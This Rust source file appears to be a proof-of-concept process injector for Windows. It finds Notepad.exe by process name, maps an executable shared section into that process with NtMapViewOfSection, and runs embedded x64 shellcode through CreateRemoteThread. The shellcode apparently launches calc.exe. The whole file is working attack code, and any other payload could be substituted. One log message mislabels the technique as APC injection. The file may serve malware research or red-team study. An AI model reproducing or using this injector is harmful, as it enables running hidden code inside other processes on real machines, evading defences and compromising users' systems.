use std::{
    ffi::{CStr, CString},
    intrinsics::copy_nonoverlapping,
    mem::{transmute, zeroed},
    ptr::{null, null_mut},
};

use ntapi::ntmmapi::NtMapViewOfSection;
use winapi::{
    ctypes::c_void, shared::ntdef::NT_SUCCESS, um::{
        errhandlingapi::GetLastError, handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, memoryapi::{FILE_MAP_EXECUTE, FILE_MAP_WRITE, MapViewOfFile, MapViewOfFileEx}, processthreadsapi::{CreateRemoteThread, OpenProcess, ResumeThread}, synchapi::WaitForSingleObject, tlhelp32::{
            CreateToolhelp32Snapshot, PROCESSENTRY32, Process32First, Process32Next,
            TH32CS_SNAPPROCESS,
        }, winbase::CreateFileMappingA, winnt::{PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS}
    }
};

const BUF: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

fn get_process_handle(process_name: &str, pid: &mut u32, process_handle: &mut *mut c_void) -> bool {
    unsafe {
        let mut process_entry = zeroed::<PROCESSENTRY32>();

        process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

        let h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if h_snapshot.is_null() {
            println!(
                "[-] CreateToolhelp32Snapshot failed with error: {}",
                GetLastError()
            );
            return false;
        }

        if Process32First(h_snapshot, &mut process_entry) == 0 {
            println!("[-] Process32First failed with error: {}", GetLastError());
            return false;
        }

        loop {
            let proc_name = CStr::from_ptr(process_entry.szExeFile.as_ptr())
                .to_str()
                .unwrap();
            if proc_name.to_lowercase() == process_name.to_lowercase() {
                *pid = process_entry.th32ProcessID;
                *process_handle = OpenProcess(PROCESS_ALL_ACCESS, 1, process_entry.th32ProcessID);
                if (*process_handle).is_null() {
                    println!("[-] OpenProcess failed with error: {}", GetLastError());
                    return false;
                }
                break;
            }

            if Process32Next(h_snapshot, &mut process_entry) == 0 {
                break;
            }
        }

        if (*process_handle).is_null() {
            return false;
        }
    }

    return true;
}

fn map_inject(
    h_process: *mut c_void,
    payload: &[u8],
    payload_size: usize,
    rpaddress: &mut *mut c_void,
) -> bool {
    unsafe {
        let h_file = CreateFileMappingA(
            INVALID_HANDLE_VALUE,
            null_mut(),
            PAGE_EXECUTE_READWRITE,
            0,
            payload_size as u32,
            null_mut(),
        );

        if h_file.is_null() {
            println!(
                "[-] CreateFileMappingA failed with error: {}",
                GetLastError()
            );
            return false;
        }

        let local_addr = MapViewOfFile(h_file, FILE_MAP_WRITE, 0, 0, payload_size);

        if local_addr.is_null() {
            println!("[-] MapViewOfFile failed with error: {}", GetLastError());
            return false;
        }

        copy_nonoverlapping(payload.as_ptr(), local_addr as *mut u8, payload_size);

        // let mut view_size = payload_size;
        // let base_address_ptr: *mut *mut c_void = paddress as *mut *mut c_void;

        let mut psize = payload_size;

        let ntstatus = NtMapViewOfSection(
            h_file, // section handle
            h_process, // process handle 
            rpaddress as *mut *mut c_void, // base address in remote process
            0, 
            0,
            null_mut(),
            &mut psize as *mut usize, // view size or size of the mapping
            2, // view share type (2 = ViewUnmap)
            0, 
            PAGE_EXECUTE_READWRITE, // protection flags for the mapped view
        );

        if NT_SUCCESS(ntstatus) == false {
            println!("[-] NtMapViewOfSection failed with NTSTATUS: 0x{:X}", ntstatus);
            return false;
        }

        println!("[+] Remote view mapped at address: {:p}", *rpaddress);

    }
    return true;
}

fn pause() {
    println!("Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn main() {
    let process_name = "Notepad.exe";
    let mut pid: u32 = 0;
    let mut process_handle: *mut c_void = null_mut();

    if get_process_handle(process_name, &mut pid, &mut process_handle) {
        println!("[+] Found process '{}' with PID: {}", process_name, pid);
    } else {
        println!("[-] Could not find process '{}'", process_name);
    }

    unsafe {
        let mut paddress = null_mut();

        if map_inject(process_handle, &BUF, BUF.len(), &mut paddress) {
            println!("[+] APC injection successful!");
        } else {
            println!("[-] APC injection failed.");
        }
        

        let h_thread = CreateRemoteThread(process_handle, null_mut(), 0, Some(transmute(paddress)), null_mut(), 0, null_mut());

        if h_thread.is_null() {
            println!("[-] CreateRemoteThread failed with error: {}", GetLastError());
        } else {
            println!("[+] Remote thread created successfully.");
            WaitForSingleObject(h_thread, 0xFFFFFFFF);
        }

        pause();



        CloseHandle(process_handle);
    }
}
